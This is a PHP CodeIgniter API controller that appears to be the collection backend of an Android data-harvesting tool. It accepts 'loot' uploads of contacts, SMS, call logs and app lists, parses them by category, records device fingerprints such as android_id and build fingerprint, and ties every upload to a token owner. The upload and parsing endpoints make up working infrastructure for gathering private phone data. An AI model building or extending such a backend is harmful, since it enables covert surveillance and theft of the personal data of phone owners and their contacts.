<?php

namespace App\Controllers\api\v1;

use App\Controllers\BaseController;
use App\Models\Mod_Parse_Loot;
use App\Models\Mod_Receive;
use App\Models\Mod_Android;
use App\Models\Mod_Crypt;
use App\Models\Mod_User;
use App\Models\Mod_Uploaded_Files;
use App\Models\Mod_Log_User_Action;
use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Model;

class Receive extends BaseController
{
    use ResponseTrait;

    // Configuration for the file upload logic
    private $uploadConfig = [
        'max_size'      => 104857600, // 10MB
        'allowed_types' => ['txt', 'enc', 'bin'],
        'upload_path'   => WRITEPATH . 'uploads/text_dump/',
        'encrypt_name'  => true,
    ];

    // Allowed file categories
    private $allowedCategories = ['contacts', 'logs', 'sms', 'apps'];

    /**
     * Upload file endpoint
     */
    public function upload()
    {
        // 1. Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        // 2. Validate token first (security first!)
        $token = $this->request->getPost('token');
        if (!$this->validateToken($token)) {
            return $this->failUnauthorized('Invalid or expired token');
        }

        // 3. Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'device_print_id' => 'required|string',
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        // 4. Get and validate file
        $file = $this->request->getFile('lootdata');
        if (!$file || !$file->isValid()) {
            return $this->fail($file ? $file->getErrorString() : 'No file uploaded');
        }

        // 5. Additional file validation
        if (!$this->validateFile($file)) {
            return $this->fail('Invalid file type or size');
        }

        // 6. Get file information BEFORE moving
        $originalName = $file->getClientName();
        $newName = $file->getRandomName();
        $fileInfo = $this->extractFileInfo($file, $newName);

        // 7. Move file securely
        if (!$file->hasMoved()) {
            try {
                $file->move($this->uploadConfig['upload_path'], $newName);
            } catch (\Exception $e) {
                log_message('error', 'File move failed: ' . $e->getMessage());
                return $this->fail('Failed to save file');
            }
        }

        // 8. Get token owner information
        $owner = $this->getTokenOwner($token);
        if (!$owner) {
            @unlink($this->uploadConfig['upload_path'] . $newName);
            return $this->fail('Invalid token owner');
        }

        // 9. Save file attributes to NEW database table via model
        $fileRecordId = $this->saveFileViaModel($token, $owner, $fileInfo);

        // 10. Process file based on category
        $result = $this->processUploadedFile($newName, $owner, $fileInfo['category'], $fileRecordId);

        if ($result && $result['success']) {
            // Update file record status via model
            if ($fileRecordId > 0) {
                $this->updateFileStatusViaModel($fileRecordId, 'processed', $result);
            }

            return $this->respondCreated([
                'status' => 'success',
                'message' => 'File uploaded and processed successfully',
                'file_id' => $newName,
                'file_record_id' => $fileRecordId > 0 ? $fileRecordId : null,
                'category' => $fileInfo['category'],
                'timestamp' => date('Y-m-d H:i:s')
            ]);
        } else {
            // Update file record status via model
            if ($fileRecordId > 0) {
                $errorMsg = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
                $this->updateFileStatusViaModel($fileRecordId, 'failed', ['error' => $errorMsg]);
            }

            $errorMessage = is_array($result) ? ($result['error'] ?? 'Processing failed') : 'Processing failed';
            return $this->fail('Failed to process uploaded file: ' . $errorMessage);
        }
    }

    /**
     * Token verification endpoint
     */
    public function token_verify()
    {
        // Validate request method
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $logModel = new Mod_Log_User_Action();

        // Validate required parameters
        $validation = $this->validate([
            'token' => 'required|min_length[8]|max_length[255]',
            'time' => 'required|string'
        ]);

        if (!$validation) {
            return $this->failValidationErrors($this->validator->getErrors());
        }

        $token = $this->request->getPost('token');
        $time = $this->request->getPost('time');
        $ip = $this->request->getIPAddress();

        // Log token verification attempt
        $this->logTokenVerification($token, $time, $ip, 'format_correct');

        // Verify token
        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);

        if (!$tokenData) {
            $this->logTokenVerification($token, $time, $ip, 'invalid_token');
            $logModel->logAction([
                'action_category' => 'authentication',
                'action_type'     => 'token_verification',
                'action_severity' => 'low',
                'success'         => 1,
                'request_url'     => current_url()
            ]);
            return $this->respond([
                'success' => false,
                'token' => $token,
                'validity' => "False",
                'message' => 'Invalid or expired token',
                'timestamp' => date('Y-m-d H:i:s'),
            ], 401);
        }

        // Get user information
        $userModel = new Mod_User();
        $cryptModel = new Mod_Crypt();

        $userData = $userModel->get_vars($tokenData['Token_Owner']);
        if (!$userData) {
            return $this->fail('User not found');
        }

        // Decrypt user information
        $userName = $this->decryptUserData($cryptModel, $userData['Name'] ?? '');
        $userEmail = $this->decryptUserData($cryptModel, $userData['Email'] ?? '');

        // Mark token as used
        $markResult = $userModel->token_mark(
            $tokenData['Token_Owner'],
            $token,
            $tokenData['Token_ID']
        );

        $logModel->logAction([
            'action_category' => 'authentication',
            'action_type'     => 'token_verification',
            'action_severity' => 'low',
            'success'         => 0,
            'request_url'     => current_url()
        ]);

        return $this->respond([
            'success' => true,
            'token' => $token,
            'validity' => true,
            'timestamp' => date('Y-m-d H:i:s'),
            'token_owner' => $tokenData['Token_Owner'],
            'token_expiry' => $tokenData['Token_Expiry'],
            'token_id' => $tokenData['Token_ID'],
            'token_owner_id' => $this->getTokenOwner($token),
        ]);
    }

    /**
     * Device print registration endpoint
     */
    public function device_print()
    {
        if (!$this->request->is('post')) {
            return $this->fail('Method not allowed', 405);
        }

        $expectedFields = [
            'device_checksum',
            'android_id',
            'device_model',
            'device_brand',
            'device_manufacturer',
            'device_product',
            'device_device',
            'device_board',
            'device_hardware',
            'android_version',
            'android_sdk_int',
            'android_security_patch',
            'build_id',
            'build_fingerprint',
            'memory_total_mb',
            'internal_storage_total_gb',
            'external_storage_total_gb',
            'app_package',
            'app_version',
            'extraction_timestamp',
            'extractor_version'
        ];

        $input = $this->request->getPost();

        // Validate required fields
        foreach ($expectedFields as $field) {
            if (empty($input[$field])) {
                return $this->failValidationError("Missing field: {$field}");
            }
        }

        // Sanitize input
        $sanitizedData = [];
        foreach ($expectedFields as $field) {
            $sanitizedData[$field] = htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8');
        }
        $sanitizedData['extraction_timestamp'] = date('Y-m-d H:i:s');

        try {
            $modelReceive = new Mod_Receive();
            $device_metadata = $modelReceive->make_device_print($sanitizedData);

            $logModel = new Mod_Log_User_Action();

            // Get request object
            $request = $this->request;

            // Extract device info from HEADERS (not POST body)
            $headers = $request->headers();

            $logModel->logAction([
                'action_category' => 'system',
                'action_type'     => 'device_registration',
                'action_severity' => 'low',
                'success'         => 1,
                'request_url'     => current_url(),
                'request_method'  => $request->getMethod(),
                'device_name'     => $request->getHeader('device_name') ?
                    $request->getHeader('device_name')->getValue() :
                    ($input['device_model'] ?? 'Unknown Device'),
                'device_type'     => $request->getHeader('device_type') ?
                    $request->getHeader('device_type')->getValue() : 'phone',
                'operating_system'=> $request->getHeader('os') ?
                    $request->getHeader('os')->getValue() : 'Android',
                'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
            ]);

            $dev_print = json_decode($device_metadata, true);

            return $this->respond([
                'success' => true,
                'android_id' => $dev_print['dev_adr_id'],
                'device_checksum' => $dev_print['dev_chck_sum'],
                'device_is_new' => $dev_print['is_new'],
                'message' => 'Device print registered successfully',
                'timestamp' => date('Y-m-d H:i:s')
            ]);

        } catch (\Exception $e) {
            log_message('error', 'Device print failed: ' . $e->getMessage());
            return $this->failServerError('Failed to register device print');
        }
    }

    /**
     * Helper Methods
     */

    /**
     * Save file via model
     */
    private function saveFileViaModel(string $token, $owner, array $fileInfo): ?int
    {
        try {
            $modelUpload = new Mod_Uploaded_Files();

            $ownerId = is_array($owner) ? ($owner['Token_Owner'] ?? null) : $owner;
            $devicePrintId = $this->request->getPost('device_print_id');

            $uploadData = [
                'original_name' => $fileInfo['original_name'],
                'new_name' => $fileInfo['new_name'],
                'size' => $fileInfo['size'],
                'extension' => $fileInfo['extension'],
                'mime_type' => $fileInfo['mime_type'],
                'category' => $fileInfo['category'],
                'token' => $token,
                'owner_id' => $ownerId,
                'device_checksum' => $devicePrintId,
                'device_print_id' => $devicePrintId,
                'upload_path' => $fileInfo['upload_path']
            ];

            return $modelUpload->logUpload($uploadData);

        } catch (\Exception $e) {
            log_message('error', 'Failed to save file via model: ' . $e->getMessage());
            return null;
        }
    }

    /**
     * Update file status via model
     */
    private function updateFileStatusViaModel(int $fileId, string $status, ?array $additionalInfo = null): bool
    {
        if ($fileId <= 0) {
            return false;
        }

        try {
            $modelUpload = new Mod_Uploaded_Files();
            return $modelUpload->updateStatus($fileId, $status, $additionalInfo);

        } catch (\Exception $e) {
            log_message('error', 'Failed to update file status via model: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Extract file information
     */
    private function extractFileInfo(\CodeIgniter\HTTP\Files\UploadedFile $file, string $newName): array
    {
        $originalName = $file->getClientName();

        return [
            'original_name' => $originalName,
            'new_name' => $newName,
            'size' => $file->getSize(),
            'extension' => $file->getExtension(),
            'mime_type' => $file->getMimeType(),
            'category' => explode('_', $originalName)[0] ?? 'unknown',
            'upload_path' => $this->uploadConfig['upload_path'] . $newName
        ];
    }

    /**
     * Process uploaded file
     */
    private function processUploadedFile($filename, $ownerId, $category, $fileRecordId = null)
    {
        if (!in_array($category, $this->allowedCategories)) {
            log_message('warning', "Unknown file category: {$category}");
            return false;
        }

        $modelParse = new Mod_Parse_Loot();
        $devicePrintId = $this->request->getPost('device_print_id');
        $startTime = microtime(true);

        $methodMap = [
            'contacts' => 'get_contacts',
            'logs' => 'get_logs',
            'sms' => 'get_sms',
            'apps' => 'get_apps'
        ];

        if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
            try {
                $result = $modelParse->{$methodMap[$category]}($filename, $ownerId, $devicePrintId, $fileRecordId);
                $durationMs = round((microtime(true) - $startTime) * 1000, 2);

                return [
                    'success' => true,
                    'record_count' => $result,
                    'duration_ms' => $durationMs,
                    'file_record_id' => $fileRecordId
                ];
            } catch (\Exception $e) {
                log_message('error', "Failed to parse {$category}: " . $e->getMessage());
                return [
                    'success' => false,
                    'error' => $e->getMessage(),
                    'duration_ms' => round((microtime(true) - $startTime) * 1000, 2)
                ];
            }
        }

        return false;
    }

    /**
     * Validate token
     */
    private function validateToken($token): bool
    {
        if (empty($token)) {
            return false;
        }

        $androidModel = new Mod_Android();
        $tokenData = $androidModel->token_test($token);
        return $tokenData !== null;
    }

    /**
     * Validate file
     */
    private function validateFile(\CodeIgniter\HTTP\Files\UploadedFile $file): bool
    {
        // Check file size
        if ($file->getSize() > $this->uploadConfig['max_size']) {
            return false;
        }

        try {
            // Check file extension
            $extension = $file->getExtension();
            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
                return false;
            }

            // Check MIME type
            $mimeType = $file->getMimeType();
            $allowedMimes = ['text/plain', 'application/octet-stream'];
            if (!in_array($mimeType, $allowedMimes)) {
                return false;
            }
        } catch (\Exception $e) {
            // Fallback validation
            $originalName = $file->getClientName();
            $extension = pathinfo($originalName, PATHINFO_EXTENSION);

            if (!in_array($extension, $this->uploadConfig['allowed_types'])) {
                return false;
            }
        }

        return true;
    }

    /**
     * Get token owner
     */
    private function getTokenOwner($token)
    {
        $modelReceive = new Mod_Receive();
        $owner = $modelReceive->get_token_owner($token);
        return $owner && $owner !== '-0-' ? $owner['Token_Owner'] : null;
    }

    /**
     * Log token verification
     */
    private function logTokenVerification($token, $time, $ip, $format)
    {
        $modelReceive = new Mod_Receive();
        $modelReceive->make_test_token($token, $time, $ip, $format);
    }

    /**
     * Decrypt user data
     */
    private function decryptUserData($cryptModel, $encryptedData)
    {
        if (empty($encryptedData)) {
            return '';
        }

        try {
            $decoded = base64_decode($encryptedData);
            if ($decoded === false) {
                return '';
            }
            return $cryptModel->Dec_String($decoded);
        } catch (\Exception $e) {
            log_message('error', 'Failed to decrypt user data: ' . $e->getMessage());
            return '';
        }
    }

    /**
     * Fail validation error helper
     */
    private function failValidationError($message)
    {
        return $this->respond([
            'success' => false,
            'message' => $message,
            'errors' => [$message]
        ], 422);
    }
}